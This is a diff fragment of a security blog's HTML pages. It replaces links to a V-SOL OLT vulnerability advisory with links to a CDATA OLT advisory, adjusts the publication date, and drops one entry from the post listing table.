-<p><a href="https://pierrekim.github.io/advisories/2020-v-sol-0x00-olt.txt">https://pierrekim.github.io/advisories/2020-v-sol-0x00-olt.txt</a></p>
-<p><a href="https://pierrekim.github.io/blog/2020-07-14-v-sol-olt-0day-vulnerabilities.html">https://pierrekim.github.io/blog/2020-07-14-v-sol-olt-0day-vulnerabilities.html</a></p>
+<p><a href="https://pierrekim.github.io/advisories/2020-cdata-0x00-olt.txt">https://pierrekim.github.io/advisories/2020-cdata-0x00-olt.txt</a></p>
+<p><a href="https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html">https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html</a></p>
 <h2>Disclaimer</h2>
 <p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
 Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
         <div>
-            <p class="text-muted">published on 2020-07-14 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
+            <p class="text-muted">published on 2020-07-07 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
         </div>
     </div>
 
@@ -299,11 +491,6 @@ Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3
         </tr>
     </thead>
     <tbody>
-    
-        <tr>
-            <td>2020-07-07 00:00:00</td>
-            <td><a href="2020-07-07-cdata-olt-0day-vulnerabilities.html">Multiple vulnerabilities found in CDATA OLTs</a></td>
-        </tr>
     
         <tr>
             <td>2020-03-09 00:00:00</td>
